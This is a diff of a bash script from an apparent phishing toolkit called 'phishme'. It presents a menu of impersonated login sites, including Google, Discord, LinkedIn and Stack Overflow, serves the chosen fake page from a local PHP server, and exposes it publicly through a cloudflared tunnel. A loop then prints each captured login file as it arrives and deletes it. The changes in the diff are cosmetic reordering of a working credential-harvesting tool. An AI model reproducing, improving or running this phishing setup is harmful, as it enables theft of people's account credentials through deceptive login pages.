@@ -21,10 +21,10 @@ The user of this tool assumes all legal responsibilities associated with its use
 
 EOF
 
-read -p "${CYAN}[**] Do You Accept The Terms ?? [yes] ~> " answer
+read -p "${WHITE}[**] Do You Accept The Terms ?? [${RED}yes${WHITE}] ~> " answer
 if [ $answer != "yes" ] ; then
 echo "${RED}"
-echo "[**] What A Waste Of Internt : Quitting !"
+echo "[**] What A Waste Of Words : Quitting !"
 echo ""
 exit
 fi
@@ -40,17 +40,6 @@ ${GREEN}88      YP   YP Y888888P  8888Y  YP   YP YP  YP  YP Y88888P
 
 ${WHITEBG}${RED}----------- https://github.com/jungawagat/phishme -----------${RESETBG}
 EOF
-
-for file in "./cloudflared/*"
-do
-if ! [[ -x $file ]] ; then
-chmod +x $file
-fi
-done
-
-if [ -f cloudflared.log ] ; then
-rm cloudflared.log
-fi
 
 machine=$(uname -m)
 
@@ -87,13 +76,20 @@ echo "[07] ~> Stack-Overflow"
 echo "[08] ~> Google"
 echo "[09] ~> Discord"
 echo "[10] ~> Linked-In"
-echo "${RED}"
+echo "${WHITE}"
 
-read -p "[**] Enter A Number ~> " number
+read -p "[**] Enter A Number ~> ${GREEN}" number
 echo "${WHITE}"
 
 startserver()
 {
+
+if ! command -v php > /dev/null ; then
+echo "$RED[**] PHP Not Installed , Install It To Run This Tool !"
+echo ""
+exit
+fi
+
 nohup php -S localhost:8080 -t $1 > /dev/null 2>&1 &
 php_pid=$!
 while ! nc -z localhost 8080
@@ -102,6 +98,17 @@ sleep 1
 done
 echo "${GREEN}[**] PHP Server Started !"
 echo ""
+
+if [ -f cloudflared.log ] ; then
+rm cloudflared.log
+fi
+
+for file in "./cloudflared/*"
+do
+if ! [[ -x $file ]] ; then
+chmod +x $file
+fi
+done
 
 nohup ./cloudflared/$cloudflared tunnel -url "localhost":"8080" --logfile cloudflared.log > /dev/null 2>&1 &
 cloudflared_pid=$!
@@ -118,21 +125,26 @@ fi
 sleep 1
 fi
 done
+
 }
 
 trap cleanup INT TERM
 
 cleanup()
 {
+
 echo "${RED}"
 echo "[**] User Exit : Killing Servers !"
+echo ""
 kill $php_pid
 kill $cloudflared_pid
 exit
+
 }
 
 capturelogin()
 {
+
 echo ""
 echo "${CYAN}[**] Waiting For Logins !"
 while true
@@ -141,6 +153,7 @@ if [ -f $1 ]; then
 echo "${RED}" ; cat $1 ; rm $1
 fi
 done
+
 }
 
 if [ $number == 01 ];then
